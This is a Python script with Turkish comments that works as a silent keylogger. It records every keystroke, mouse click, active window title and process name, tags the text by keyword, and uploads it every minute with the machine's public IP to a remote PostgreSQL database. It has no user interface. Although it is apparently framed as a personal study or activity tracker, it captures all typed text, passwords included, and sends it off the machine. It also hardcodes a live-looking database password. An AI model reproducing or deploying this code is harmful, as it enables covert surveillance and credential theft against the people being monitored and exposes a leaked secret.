import ctypes
import time
import threading
import sys
import requests
import psycopg2
import psutil
import traceback
from pynput import keyboard, mouse
from datetime import datetime

# --- HATA YAKALAYICI KARA KUTU ---
def log_hata(hata_mesaji):
    with open("hata_logu.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {hata_mesaji}\n")

try:
    # --- NEON BULUT VERİTABANI BAĞLANTISI ---
    DATABASE_URL = "postgresql://neondb_owner:npg_fekm1rsUZ5TR@ep-green-cell-ah2wf67f-pooler.c-3.us-east-1.aws.neon.tech/neondb?sslmode=require"
    try: CIHAZ_IP = requests.get('https://api.ipify.org', timeout=5).text
    except: CIHAZ_IP = "Bilinmeyen_Cihaz"

    # --- GELİŞMİŞ İSTİHBARAT AYARLARI ---
    BOS_KALMA_SURESI = 10       
    TOPLU_GONDERIM_SURESI = 60  
    AFK_SURESI = 180            

    KATEGORILER = {
        "🚀 Teknofest & Ar-Ge": ["cellfire", "type-", "teknofest", "proje", "rapor", "sunum", "araştırma"],
        "🧪 Kimya & Laboratuvar": ["kimya", "deney", "reaksiyon", "periyodik", "asistan", "element"],
        "💻 Yazılım & Geliştirme": ["python", "vscode", "pomodoro", "def ", "import ", "github", "localhost", "streamlit"],
        "📺 Medya & Araştırma": ["youtube", "video", "mp4", "pdf", "chatgpt", "gemini"],
        "💬 İletişim & Sosyal": ["whatsapp", "discord", "mail", "telegram"]
    }

    # --- AJANIN HAFIZASI ---
    aktif_pencere, aktif_exe, canli_metin = "", "", ""
    son_aktivite_zamani = time.time()   
    son_etkilesim_zamani = time.time()  
    son_bulut_gonderim = time.time()

    tus_vurusu = 0
    fare_tiklamasi = 0
    oturum_baslangici = time.time()
    afk_modu = False

    veri_kilidi = threading.Lock()
    genel_kuyruk = []

    # --- ARKA PLAN AĞ VE DB KURULUMU ---
    def sistem_altyapisini_hazirla():
        try:
            conn = psycopg2.connect(DATABASE_URL)
            cursor = conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS loglar (
                    id SERIAL PRIMARY KEY, zaman TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                    ip_adresi TEXT, uygulama_sekme TEXT, uygulama_exe TEXT,
                    yazilan_metin TEXT, kategori TEXT, klavye_hizi INTEGER DEFAULT 0,
                    tiklama_sayisi INTEGER DEFAULT 0
                );
            """)
            try: cursor.execute("ALTER TABLE loglar ADD COLUMN IF NOT EXISTS uygulama_exe TEXT;")
            except: pass
            try: cursor.execute("ALTER TABLE loglar ADD COLUMN IF NOT EXISTS klavye_hizi INTEGER DEFAULT 0;")
            except: pass
            try: cursor.execute("ALTER TABLE loglar ADD COLUMN IF NOT EXISTS tiklama_sayisi INTEGER DEFAULT 0;")
            except: pass
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_ip_adresi ON loglar(ip_adresi);")
            conn.commit()
            conn.close()
        except Exception as e:
            log_hata(f"Veritabani baglanti hatasi: {e}")

    sistem_altyapisini_hazirla()

    # --- SENSÖR FONKSİYONLARI ---
    def aktif_sekmeyi_ve_exeyi_bul():
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            if not hwnd: return "Masaüstü / Bilinmeyen", "bilinmiyor.exe"
            uzunluk = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(uzunluk + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, uzunluk + 1)
            baslik = buf.value if uzunluk > 0 else "Masaüstü"

            pid = ctypes.c_ulong()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            try: exe_adi = psutil.Process(pid.value).name().lower()
            except: exe_adi = "bilinmiyor.exe"
            return baslik, exe_adi
        except: return "Bilinmeyen Pencere", "hata.exe"

    def metni_kategorize_et(metin, pencere):
        analiz_metni = (metin + " " + pencere).lower()
        for kategori, kelimeler in KATEGORILER.items():
            if any(kelime in analiz_metni for kelime in kelimeler): return kategori
        return "📁 Genel Çalışma"

    def veriyi_kuyruga_ekle(metin, pencere, exe_adi):
        global genel_kuyruk, tus_vurusu, fare_tiklamasi, oturum_baslangici
        gecen_sure = (time.time() - oturum_baslangici) / 60.0
        kpm = int(tus_vurusu / gecen_sure) if gecen_sure > 0 else tus_vurusu * 60

        if len(metin.strip()) > 1 or fare_tiklamasi > 2:
            kategori = metni_kategorize_et(metin, pencere)
            temiz_metin = metin.strip() if metin.strip() != "" else "[SADECE FARE KULLANILDI]"
            genel_kuyruk.append((CIHAZ_IP, pencere, exe_adi, temiz_metin, kategori, kpm, fare_tiklamasi))

        tus_vurusu = 0; fare_tiklamasi = 0; oturum_baslangici = time.time()

    def buluta_toplu_firlat():
        global genel_kuyruk, son_bulut_gonderim
        if not genel_kuyruk:
            son_bulut_gonderim = time.time()
            return
        yedek_kuyruk = genel_kuyruk.copy()
        genel_kuyruk.clear()
        try:
            conn = psycopg2.connect(DATABASE_URL)
            cursor = conn.cursor()
            cursor.executemany("INSERT INTO loglar (ip_adresi, uygulama_sekme, uygulama_exe, yazilan_metin, kategori, klavye_hizi, tiklama_sayisi) VALUES (%s, %s, %s, %s, %s, %s, %s)", yedek_kuyruk)
            conn.commit()
            conn.close()
            son_bulut_gonderim = time.time()
        except Exception as e:
            genel_kuyruk.extend(yedek_kuyruk)
            log_hata(f"Toplu gonderim hatasi: {e}")

    def arka_plan_takip_dongusu():
        global aktif_pencere, aktif_exe, canli_metin, son_aktivite_zamani, afk_modu
        while True:
            zaman_farki = time.time() - son_aktivite_zamani
            afk_farki = time.time() - son_etkilesim_zamani
            yeni_pencere, yeni_exe = aktif_sekmeyi_ve_exeyi_bul()

            with veri_kilidi:
                if afk_farki > AFK_SURESI and not afk_modu:
                    veriyi_kuyruga_ekle(canli_metin, aktif_pencere, aktif_exe)
                    canli_metin = ""; afk_modu = True
                    veriyi_kuyruga_ekle("[AFK BAŞLADI]", "Sistem Uyku Modu", "system.exe")

                if (yeni_pencere != aktif_pencere or yeni_exe != aktif_exe) and (canli_metin != "" or fare_tiklamasi > 0):
                    veriyi_kuyruga_ekle(canli_metin, aktif_pencere, aktif_exe)
                    canli_metin = ""; aktif_pencere, aktif_exe = yeni_pencere, yeni_exe
                    
                elif zaman_farki > BOS_KALMA_SURESI and (canli_metin != "" or fare_tiklamasi > 0):
                    veriyi_kuyruga_ekle(canli_metin, aktif_pencere, aktif_exe)
                    canli_metin = ""

                if aktif_pencere != yeni_pencere: aktif_pencere, aktif_exe = yeni_pencere, yeni_exe

            if time.time() - son_bulut_gonderim >= TOPLU_GONDERIM_SURESI: buluta_toplu_firlat()
            time.sleep(0.1)

    def etkilesim_oldu():
        global son_aktivite_zamani, son_etkilesim_zamani, afk_modu
        son_aktivite_zamani = time.time(); son_etkilesim_zamani = time.time()
        if afk_modu:
            afk_modu = False
            veriyi_kuyruga_ekle("[AFK BİTTİ]", "Sistem Uyku Modu", "system.exe")

    def tusa_basildiginda(tus):
        global canli_metin, tus_vurusu
        etkilesim_oldu()
        with veri_kilidi:
            tus_vurusu += 1
            try:
                if tus == keyboard.Key.space: canli_metin += " "
                elif tus == keyboard.Key.enter: canli_metin += " [ENTER] "
                elif tus == keyboard.Key.backspace: canli_metin = canli_metin[:-1] if len(canli_metin) > 0 else ""
                elif hasattr(tus, 'char') and tus.char is not None: canli_metin += tus.char
            except: pass 

    def fare_tiklandiginda(x, y, button, pressed):
        if not pressed: return
        global fare_tiklamasi
        etkilesim_oldu()
        with veri_kilidi: fare_tiklamasi += 1

    def fare_hareket_ettiginde(x, y):
        global son_etkilesim_zamani, afk_modu
        son_etkilesim_zamani = time.time()
        if afk_modu: afk_modu = False

    # --- SİSTEMİ ATEŞLE (Arayüzsüz Saf Dinleme) ---
    takip_thread = threading.Thread(target=arka_plan_takip_dongusu, daemon=True)
    takip_thread.start()

    with keyboard.Listener(on_press=tusa_basildiginda) as k_listener, \
         mouse.Listener(on_click=fare_tiklandiginda, on_move=fare_hareket_ettiginde) as m_listener:
        k_listener.join()
        m_listener.join()

except Exception as kritik_hata:
    log_hata(traceback.format_exc())